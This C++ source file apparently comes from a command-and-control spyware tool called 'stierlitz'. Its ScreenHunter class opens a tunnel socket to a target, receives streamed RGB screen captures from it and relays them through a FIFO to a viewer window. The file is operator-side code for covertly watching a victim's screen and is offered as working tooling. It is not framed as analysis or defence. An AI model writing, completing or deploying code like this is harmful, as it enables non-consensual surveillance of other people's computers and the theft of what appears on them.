#include "screen_hunter.hpp"

void ScreenHunter::exec_spy() {
    int rc = accept_tunnel_end();
    if (rc < 0) {
        return;
    }

    std::cout << MAGENTA << "Time to sleep: " << timeout_ms_ / 1e3 << RESET;
    std::cout << MAGENTA << "fps: " << fps_ << RESET;
    
    uint32_t fps_net;
    memcpy(&fps_net, &fps_, sizeof(float));
    fps_net = htonl(fps_net);;

    rc = send(tunnel_end_socket_, &fps_net, sizeof(fps_net), 0);
    if (rc <= 0) {
        write_fifo_error("[SpyTunnel::run] Error sending the fps value" + std::string(strerror(errno)));
        return;
    }
    
    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        write_fifo_error("[SpyTunnel::run] Error creating epoll_fd" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event screen_hunter_tunnel_end_event;
    screen_hunter_tunnel_end_event.data.fd = tunnel_end_socket_;
    screen_hunter_tunnel_end_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &screen_hunter_tunnel_end_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_end_socket_ to epoll" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event scree_hunter_fifo_event;
    scree_hunter_fifo_event.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
    scree_hunter_fifo_event.data.fd = tunnel_fifo_;

    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_fifo_, &scree_hunter_fifo_event) == -1) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_end_socket_ to epoll" + std::string(strerror(errno)));
        return;
    }

    char buffer[RGB_BUFFER_SIZE] = {0};
    int write_offset = 0;
    int bytes_to_write = 0;
    bool waiting_for_fifo = false;

    struct epoll_event events[3];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 3, timeout_ms_);
        if (nfds < 0) {
            return;
        } else if (nfds == 0) { 
            write_fifo_error("Timeout ocurred. Terminating the screen-hunter");
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                // Server shuts down
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                }
                return;
            } else if (events[i].data.fd == tunnel_end_socket_) {
                // Data from the target.
                if (!waiting_for_fifo) {
                    bytes_to_write = recv(tunnel_end_socket_, buffer, RGB_BUFFER_SIZE, 0);
                    if (bytes_to_write <= 0) {
                        std::cout << MAGENTA << "Failed to receive from tunnel_end_socket_" << RESET;
                        write_fifo_error("Was unable to receive buffer from tunnel_end_socket_");
                        return;
                    }
                    write_offset = 0;
                    waiting_for_fifo = true;
                }
            } else if (events[i].data.fd == tunnel_fifo_ && (events[i].events & EPOLLOUT)) {
                if (waiting_for_fifo && bytes_to_write > 0) {
                    ssize_t rc = write(tunnel_fifo_, buffer + write_offset, bytes_to_write);
                    if (rc < 0) {
                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
                            // FIFO still full, wait for next EPOLLOUT event
                            continue;
                        } else {
                            close(tunnel_fifo_);
                            tunnel_fifo_ = -1;
                            write_fifo_error("Error writing data to tunnel_fifo_: " + std::string(strerror(errno)));
                            return;
                        }
                    } else {
                        write_offset += rc;
                        bytes_to_write -= rc;

                        if (bytes_to_write == 0) {
                            waiting_for_fifo = false;
                        }
                    }
                }
            }
        } 
    }
}

void ScreenHunter::spawn_window() {
    std::string end_key_len_str = std::to_string(END_KEY_LEN);
    std::string res_update_key_len_str = std::to_string(RES_UPDATE_KEY_LEN);
    std::string timeout_ms_str = std::to_string(timeout_ms_);

    execlp(
        "urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", 
        "-e", SCREEN_HUNTER_SCRIPT_PATH, 
        fifo_path_.c_str(), 
        END_KEY, end_key_len_str.c_str(), 
        RES_UPDATE_KEY, res_update_key_len_str.c_str(),
        timeout_ms_str.c_str(),
        (char*)NULL
    );
}

void ScreenHunter::set_fps(float __fps) {
    fps_ = __fps;
    timeout_ms_ = static_cast<long>(((1.0 / fps_) + 5) * 1e3); // 5 second timeout range than expected
}